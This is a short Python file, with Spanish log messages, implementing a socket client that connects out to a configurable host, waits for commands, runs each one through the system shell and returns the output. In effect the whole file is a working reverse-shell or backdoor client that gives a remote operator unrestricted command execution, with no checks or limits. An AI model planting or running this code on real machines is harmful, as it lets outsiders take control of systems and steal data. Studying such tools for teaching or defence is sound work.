import socket
import subprocess
from time import sleep


class ServerCloseSocket(Exception):
    """Exception thrown when the server close the socket"""
    pass


class SockerClient:
    def __init__(self, direction, port, time_recv_out, retry):
        self.direction = direction
        self.port = port
        self.retry = retry
        self.time_recv_out = time_recv_out
        self.socket = socket.socket()

    def try_socket_connection(self):
        while True:
            print("Intentando conectarse a {}:{}".format(self.direction, self.port))
            try:
                self.socket.connect((self.direction, self.port))
                break
            except ConnectionRefusedError:
                print("La conexión fallo")
                if self.retry:
                    print("Reintentando...")
                    sleep(1)
                else:
                    print("Saliendo")
                    break

    def init_recv_command(self):
        print("Esperando comandos...")
        while True:
            command_recv = self.__recv_command_from_server__()
            print("Comando recibido:", command_recv)
            command_response = subprocess.Popen(
                command_recv,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE)
            stdout, stderr = command_response.communicate()
            if stdout == b"" and stderr == b"":
                self.socket.sendall(b"success:with out output")
            elif stdout != b"":
                self.socket.sendall(stdout)
            else:
                self.socket.sendall(stderr)

    def __recv_command_from_server__(self, convert: bool = True):
        if self.time_recv_out:
            self.socket.settimeout(self.time_recv_out)
        response = self.socket.recv(2048)
        if response != b"":
            return response.decode() if convert else response
        else:
            raise ServerCloseSocket()

    def __del__(self):
        print("Limpiando conexiones del cliente")
        self.socket.close()
